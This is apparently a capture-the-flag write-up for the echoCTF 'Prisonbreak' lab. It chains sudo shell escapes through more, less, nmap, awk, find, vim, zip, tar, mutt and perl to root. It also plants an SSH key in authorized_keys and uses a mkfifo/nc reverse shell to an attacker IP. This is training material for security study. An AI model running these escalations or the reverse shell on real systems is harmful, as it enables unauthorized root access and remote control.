---
layout: post
title: Prisonbreak
feature-img: "assets/img/portfolio/prisonbreak.png"
img: "assets/img/portfolio/prisonbreak.png"
date: 23 jun 2021
tags: [Bin, ssh]
---



[prisonbreak](https://echoctf.red/target/37)


Try to escape from every cell. Last cell grants root access. Every cell has a flag with username and password for the current user.

You can ssh directly to the specific cell with the provided details to continue in case you stopped your escape midway.

---

### Enumartion


```
nmap -sC -sV -p- 10.0.40.0  

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 39:d8:72:f0:6f:74:58:78:ea:2b:e4:06:b9:82:67:65 (RSA)
|   256 55:8b:25:46:3d:72:08:35:46:23:4f:4c:fa:70:ba:a7 (ECDSA)
|_  256 10:ce:b4:58:a2:c3:59:5b:0f:e7:91:e3:6a:04:fb:4e (ED25519)
1337/tcp open  waste?



```

connecting to 10.0.40.0 with nc gave me some for *more* app.

```
NAME
       more - file perusal filter for crt viewing

```


### vulnerability

application - *more*


### RCE  *more*

i esceaped with !/bin/bash and i got shell. 

```
nc  10.0.40.0 1337 -v                                                                                                                                                                    130 ⨯ 2 ⚙
Connection to 10.0.40.0 1337 port [tcp/*] succeeded!
cell1@prisonbreak:/home/cell1$ 
```
then i genereted ssh key and conected via ssh.

```
cell1@prisonbreak:/home/cell1$ whoami    
whoami
cell1

mkdir .ssh
ssh-keygen 
cd .ssh
cp id_rsa.pub authorized_keys
cat id_rsa
```

then i copied the key and connected from my machine. 

chmod 600 more.key
ssh -i more.key cell1@10.0.40.0

*cell1@prisonbreak:*



cell1@prisonbreak:~$ sudo -l
Matching Defaults entries for cell1 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell1 may run the following commands on prisonbreak:
    (cell2) NOPASSWD: /bin/more



### Privilige escelation *more*

[gtfobins](https://gtfobins.github.io/gtfobins/more/)



```
TERM= more /etc/profile
!/bin/bash

cell2@prisonbreak:/home/cell1$ 

$ 

```

cell2@prisonbreak:/home/cell1$ sudo -l
Matching Defaults entries for cell2 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell2 may run the following commands on prisonbreak:
    (cell3) NOPASSWD: /usr/bin/less



### Privilige escelation */usr/bin/less*

```
sudo -u cell3 less /etc/profile
!/bin/bash

cell3@prisonbreak:/home/cell1$ whoami
cell3
```

Matching Defaults entries for cell3 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell3 may run the following commands on prisonbreak:
    (cell4) NOPASSWD: /usr/bin/nmap



### Privilige escelation */usr/bin/nmap*

after some tries i found it was non interactive nmap

```
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo -u cell4  nmap --script=/tmp/shell.nse

cell3@prisonbreak:/tmp$ echo "os.execute('/bin/bash')" > /tmp/shell.nse
cell3@prisonbreak:/tmp$ sudo -u cell4  nmap --script=/tmp/shell.nse

Starting Nmap 7.40 ( https://nmap.org ) at 2022-08-10 06:24 UTC
cell4@prisonbreak:/tmp$ 

```
here id did pitstop and created new ssh to cell4 same as cell1.

sudo -l 
Matching Defaults entries for cell4 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell4 may run the following commands on prisonbreak:
    (cell5) NOPASSWD: /usr/bin/awk

### Privilige escelation */usr/bin/awk*

```
It can be used to break out from restricted environments by spawning an interactive system shell.

awk 'BEGIN {system("/bin/sh")}'

cell4@prisonbreak:~$ sudo -u cell5 /usr/bin/awk 'BEGIN {system("/bin/sh")}'
$ 
$ id
uid=1005(cell5) gid=1004(cell5) groups=1004(cell5)
$ 
```

sudo -l 
Matching Defaults entries for cell5 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell5 may run the following commands on prisonbreak:
    (cell6) NOPASSWD: /usr/bin/find



### Privilige escelation */usr/bin/find*

```
$ cd /tmp
$ sudo -u cell6 /usr/bin/find . -exec /bin/sh \; -quit


$ id
uid=1006(cell6) gid=1005(cell6) groups=1005(cell6)
$ 
```

$ sudo -l 
Matching Defaults entries for cell6 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell6 may run the following commands on prisonbreak:
    (cell7) NOPASSWD: /usr/bin/vim
$ 

### Privilige escelation */usr/bin/vim*

```
sudo -u cell7 /usr/bin/vim -c ':!/bin/sh' /dev/null

$ id
uid=1007(cell7) gid=1006(cell7) groups=1006(cell7)
$ 
```

sudo -l 
Matching Defaults entries for cell7 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell7 may run the following commands on prisonbreak:
    (cell8) NOPASSWD: /usr/bin/links


### Privilige escelation */usr/bin/links*

some reading about links and i saw that under menu i have option to os.shell 

![](assets/img/portfolio/cell8.png)


cell8@prisonbreak:~$ 


sudo -l 
Matching Defaults entries for cell8 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell8 may run the following commands on prisonbreak:
    (cell9) NOPASSWD: /usr/bin/lynx


### Privilige escelation */usr/bin/lynx*

For this example we have configured “/usr/bin/vim”. Hitting “Accept Changes”, lynx will take us back to Google page. Now we move our cursor to the search text box and hit “e” to edit the content with an external editor we configured. lynx will take us to vim

then we break out with :  !/bin/bash 

cell9@prisonbreak:/home/cell8$ 

sudo -l 
Matching Defaults entries for cell9 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell9 may run the following commands on prisonbreak:
    (cell10) NOPASSWD: /usr/bin/zip



### Privilige escelation */usr/bin/zip*

It can be used to break out from restricted environments by spawning an interactive system shell.

```
sudo -u cell10 /usr/bin/zip $TF /etc/hosts -T -TT '/bin/bash #'
  adding: etc/hosts (deflated 38%)
$ id
uid=1010(cell10) gid=1009(cell10) groups=1009(cell10)
$ 
```

sudo -l 
Matching Defaults entries for cell10 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell10 may run the following commands on prisonbreak:
    (cell11) NOPASSWD: /bin/tar




### Privilige escelation */usr/bin/tar*

It can be used to break out from restricted environments by spawning an interactive system shell.

```
sudo -u cell11 /bin/tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
$ 
$ id
uid=1011(cell11) gid=1010(cell11) groups=1010(cell11)
```

sudo -l 
Matching Defaults entries for cell11 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell11 may run the following commands on prisonbreak:
    (cell12) NOPASSWD: /usr/bin/mutt


### Privilige escelation */usr/bin/mutt*

i opend the program - sudo -u cell12 /usr/bin/mutt

and escaped with:

```
:!/bin/bash -i 

cell12@prisonbreak:/tmp$ id
uid=1012(cell12) gid=1011(cell12) groups=1011(cell12)

```

sudo -l 
Matching Defaults entries for cell12 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell12 may run the following commands on prisonbreak:
    (cell13) NOPASSWD: /usr/bin/pinfo


### Privilige escelation */usr/bin/pinfo*

runing the program, i notice that if i click on "!", i have option to run commands, 
i tried to spawn shell, didnt have success, so i did reverse shell and i got shell as cell 13. 


```
!  - enter command

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.0.10 5555 >/tmp/f

nc -lnvp 5555

id
uid=1013(cell13) gid=1012(cell13) groups=1012(cell13)
```

sudo -l 
Matching Defaults entries for cell13 on prisonbreak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cell13 may run the following commands on prisonbreak:
    (root) NOPASSWD: /usr/bin/perl


### Privilige escelation */usr/bin/perl*  (last flag)


It can be used to break out from restricted environments by spawning an interactive system shell.

```
 sudo -u root /usr/bin/perl -e 'exec "/bin/bash";'


root@prisonbreak:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@prisonbreak:/tmp# 

```


after 14 users i got the root :) 








